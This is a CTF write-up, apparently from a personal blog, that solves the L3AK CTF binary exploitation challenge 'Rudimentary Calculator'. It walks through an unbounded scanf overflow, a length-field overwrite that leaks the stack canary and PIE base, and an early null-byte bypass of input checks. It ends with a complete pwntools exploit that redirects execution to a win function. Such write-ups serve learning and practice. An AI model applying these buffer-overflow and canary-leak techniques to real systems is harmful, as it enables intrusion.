---
title: "L3AKCTF: Rudimentary Clock Writeup"
date: 2026-08-02
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "l3akctf"
  - "binary exploitation"
  - "reverse-engineering"
---

I tried my luck in this week's L3AK CTF to see if there are any interesting pwn challenges I can solve. What I found was an amazing CTF with variety of challenges. I decided to go easy on myself and try the easiest looking pwn challenge: Rudimentary Calculator.

This challenge although looks easy, it took me a while to find a solution. It also made me realize after studying pwn for a while, I got so used to working on text-book like challenges, when presented a proper app with a bug in it, I wasn't ready to solve it. I love challenges that actually challenge my understanding and knowledge so I can learn and grow more! Anyways, enough chit chat, let's get to the writeup.

## Initial Look

We are given the source code of the challenge <3 Really nice, trying to figure out the logic from ghidra's decompiled output would have been a challenge by itself. Initial look at the code reveals:

1. It is a simple calculator that can only do multiplication.

2. Input to the program has to follow a certain criteria, otherwise it exists. Format is:
`I_1*I_2*I_3*...I_n` where each input value is single digit in base 16 (0 to F).

3. Can't provide two digit numbers like 20 (other than A to F of course) 

4. Multiplication * or x has to follow the numbers at every `i % 2 == 1`

5. Expression is entered through an unbounded scanf call: `scanf("%s", s.buf);`

6. Once the expression is given and it follows the format properly, multiplication is executed and resulting number is stored in a `96 * 4 = 384` bytes result buffer, pretty large buffer to hold ginourmous numbers.

7. Resulting big number is printed after all the multiplications are executed

Okay we can now spot two of the critical bugs, one **scanf can overflow the input buffer** and two multiplication result isn't bounded, meaning **if you can enter a sequence that will generate more than 384 bits, you can overflow the product_bignum buffer!** 

Other than these two, I think there is another buffer boundary related bug in `to_base_10` function: `memcpy(tmp, product_bignum, product_bignum_len * sizeof(uint32_t));` where if chained properly we can read beyond the size of product_bignum buffer. 

Looking at the code, we are also given a win function. So solution is quite straightforward:

* Leak PIE
* Overflow one of the buffers and overwrite the return address to win function.

Well, solution looks simple, but was it easy to execute? Hell NO! I went through a lot of debugging to understand calculations, how I should provide an expression to overflow 384 bytes with a very big number result.. Some rabbit holes I shouldn't have entered but I did regardless...Yea, it was a bit painful but fun ride. But the funny thing is, once I found the solution it looked so simple and easy, I almost wasn't going to write this writeup thinking it is so easy, nobody will care. But maybe someone will, someone like me who spent hours on the wrong side of the solution. So here we are.

## PIE and Canary Leak

We need a pie leak, I don't think there is any way around this. At some point I thought, maybe we can do this by overwriting the LSB two bytes of return address with a 1/16 chance to guess the unknown 4 bits nibble but looking at the code again, I don't think that is possible:

```cpp
void multiply_digit(int digit, uint32_t *product_bignum, int *product_bignum_len) {
    uint64_t carry = 0;
    for (int i = 0; i < *product_bignum_len; i++) {
        uint64_t prod = (uint64_t)product_bignum[i] * digit + carry;
        product_bignum[i] = (uint32_t)(prod & 0xFFFFFFFF);
        carry = prod >> 32;
    }
    if (carry) {
        product_bignum[*product_bignum_len] = (uint32_t)carry;
        (*product_bignum_len)++;
    }
}
```
When there is a carry, when multiplication overflows the last 32bits stored, it overwrites the next integer in the buffer with carry. **This is an integer level write, 32 bits are overwritten. It means if overflow into the return address in stack, we will overwrite 32 bits of which only 12 bits are known.** So we can't really try our luck with 20 bits. We have to leak the PIE!

What is our leak source then? `to_base_10` function. `memcpy there reads product_bignum to product_bignum + 32*product_bignum_len`. Well this looks reasonable since it wants to print the big number so it has to read by the size of it. But here is the catch: what if we can set `product_bignum_len` to something else, something bigger than the size of the buffer? It would read outside of the buffer! This is our leak. **We can overwrite product_bignum_len by using the unbounded scanf** 

Let's look at an example. Buffer used in the scanf call is 4096 bytes, so we need to provide an expression at least 4096 characters long to fill that buffer, and next value in the stack after the buffer is `product_bignum_len`. Consider this payload:

`payload = b'1*' * 2048 + b'1'`

I put a breakpoint after the multiplication to see what happened in the memory. It looked like `rdx` was holding a pointer to the structure in memory, so we can investigate the length and product arrays by skipping 4096 bytes from it:

![Memory](/assets/img/l3ak_memory.png)

Here the first marked region at the top is for `product_bignum_len`, this is supposed to be 1 since the multiplication result should end up 1. But scanf overflow wrote the `1` into there making it take the value 0x31. Continuing with the run prints a very big number where `to_base_10` function reads the memory by `product_bignum_len * 4` bytes and converts it to a number. **That means if we override `product_bignum_len` large enough it will read canary and return address and print it as part of the big number!** Canary and return address is marked in the image. `to_base_10` function starts reading after length integer in memory, so from example we need to read from `0x7ffcf2e047d4` to `0x7ffcf2e04970` which gives us the required length value to be:

`(0x7ffcf2e04970 - 0x7ffcf2e047d4) / 4 = 412/4 = 103 integers = 0x67`

So this time we try to set it to 0x67 with new payload `payload = b'1*' * 2048 + b'\x67'` BUT IT DOESN'T WORK!!! Remember the conditions? We can only provide digits 0 to f, and surprisingly 0x67 is g. I feel that was an intentional design choice by the author. 

### Finding the actual bug

I tried around a bit to see if I can get a reliable leak, but it wasn't working. My next idea was instead of overflowing scanf buffer, what if I use an expression that would generate very big numbers originally so that length field becomes 0x67 naturally? Well it was a good try but failed. Here take this payload for an example: `payload = b'f*' * 796 + b'f'` It is well within the limits of scanf buffer, but it generates a result that is bigger than what `uint32_t product_bignum[0x60]` buffer can hold:

![Canary overwritten](/assets/img/l3ak_canary.png)

Here we naturally generated 0x62 in the length field which can leak the first 4 bytes of canary, but looking at the canary, its 4 bytes are overwritten with the multiplication result!

Then I realized, I have to find a way to skip `multiply_digit` calls, **because whatever I provide goes through multiplication which also modifies the memory.** Well, no sh*t Sherlock! It should have been obvious from the start, but I was so fixated on my way that I didn't realize there would be better and easier ways. 

This was the most important realization that helped me reach the solution. If multiplication operations are modifying memory, and I set a different length value with a overflow, these multiplication operations will also modify the canary and return address! I wanted to generate a crazy expression that would magically have the right canary and modified return address at the right positions! But since I can't leak it this way, that also meant I can't modify the return address this way. So here goes my last few hours I guess. The moment I realized this and looked for a different way, I quickly found it in the for loop:

```cpp
            } else {
                if (s.buf[i] == '\0') {
                    break;
                }
```

This little condition, very simple, clean and looks very innocent! But it is the devil in hiding. If you haven't solved this challenge and reading it now, I am sure you also got hit by the same realization: `If I provide the null byte in the second position, for loop breaks and no further checks are executed, no further multiplications run, we can provide anything after that!`

So we can actually overwrite the length field easily this way with this payload `payload = b'1\x00' + b'A'*4094 + p32(0x67)` Initial digit has to follow the rules to get 1 * D working, and then we finish the multiplication sequence with a null byte, and rest is classic buffer overflow with whatever we want. We can then receive the printed big number which we can then convert back to hex and get the parts we want:

![Leak Success](/assets/img/l3ak_leaksuccess.png)

## Final Solution

Once I manage to get the leak of canary and return address working. Getting the final solution was quite easy. Now we know the canary and PIE, we just need to follow the same buffer overflow technique with early null termination to overwrite the return address however we want. I don't think there is much I can add to what I already discovered, so I will leave you with my final solution:

```python
from pwn import *

exe  = './chall'
elf  = ELF(exe)

context.binary = elf
# context.log_level = 'debug'
# context.aslr = False

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        p = remote('rudimentary-calculator.instances.ctf.l3ak.team', 1337, ssl = True)
        return p
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
b *run+1061
c
""".format(**locals())

p = start()  

# Length = 0x67 is just enough to reach return address in the stack
payload = b'1\x00' + b'A'*4094 + p32(0x67)

p.sendlineafter(b'> ', payload)
p.readuntil(b'Result: ')

res_int = int(p.readuntil(b'\n', drop=True))
res_hex = hex(res_int)[2:]  # ignore 0x part

ret_hex = res_hex[0:12]
can_hex = res_hex[28:44]
elf.address = int(ret_hex, 16) - (elf.sym.main + 58)    # Return address we receive points to main + 58

print(f'{ret_hex}  {can_hex}')

# Second run this time we modify return address and send canary as is with
# using scanf buffer overflow
can_val = int(can_hex, 16)
new_return = elf.sym.win

# Fill buffer, fill len and bignumber, then canary, then rbp and return
payload  = b'1\x00' + b'A'*4094     # Fill the buffer  
payload += p32(0x67) + p32(0)       # Length + first 4 bytes of product buffer
payload += b'\x00'*96*4             # Rest of the product buffer
payload += p64(can_val) + p64(0) + p64(new_return)  # Canary + rbp + return address
p.sendlineafter(b'> ', payload)

# Now quit and get flag!
p.sendlineafter(b'> ', b'quit')

p.interactive()
```

## Final Words

Very fun challenge overall. It has showed me that sometimes I get fixated on more difficult and complex ways that I forgot to look for easy bugs. My brain still wants to find a crazy solution by assuming we know canary and PIE and generate an expression that would result in a very big number with right values generated in right places, but I can't see myself finding a mathematical way to generate 3000+bits number with such requirements!. 

Once I found the early null termination, solution was quite easy. I wasn't sure if I should publish this writeup or not, but I think several hours spent on the wrong path deserved the recognition through this documentation. Hopefulyl it will help someone like me who spent the time on wrong solution, and gave up afterwards instead of keep looking.   

As always, keep learning!

